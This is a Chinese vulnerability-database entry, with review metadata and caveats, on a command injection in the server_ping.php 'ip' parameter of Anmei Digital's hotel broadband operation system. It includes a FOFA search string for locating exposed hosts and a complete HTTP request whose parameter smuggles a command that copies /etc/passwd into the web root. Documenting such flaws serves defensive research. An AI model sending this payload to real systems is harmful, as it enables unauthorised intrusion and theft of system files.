---
source: "wy876 漏洞文库"
title: "安美数字酒店宽带运营 server_ping ip命令注入"
product: "安美数字酒店宽带运营"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Linux路径布局；版本未知"
prerequisites: "请求带PHPSESSID，实际需要未知"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gvrg0qu31td8ab01"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F/%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fserver_ping%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
previous_fofa_unverified: "酒店宽带运营"
id: "vw-592889ff7bdff7c56d138a26"
entity_id: "ve-592889ff7bdff7c56d138a26"
schema_version: "1"
fofa: "\"酒店宽带运营\""
---

# 安美数字酒店宽带运营 server_ping ip命令注入

## 条目说明

- 对象与具体问题：安美数字酒店宽带运营；server_ping ip命令注入
- 版本、配置及部署条件：Linux路径布局；版本未知
- 认证与权限前提：请求带PHPSESSID，实际需要未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 向Web根写passwd副本有信息泄露/覆盖副作用，无清理；静态旧文件可能误判
- 无返回内容，HTTP误标Rust；不能单靠路径认执行成功
- 补版本和匿名对照

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行。

## 二、影响版本
+ 安美数字 酒店宽带运营系统

## 三、资产测绘
+ fofa`"酒店宽带运营"`
+ 特征


## 四、漏洞复现
```http
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../stc.txt&id=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04
```


```rust
/stc.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gvrg0qu31td8ab01>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
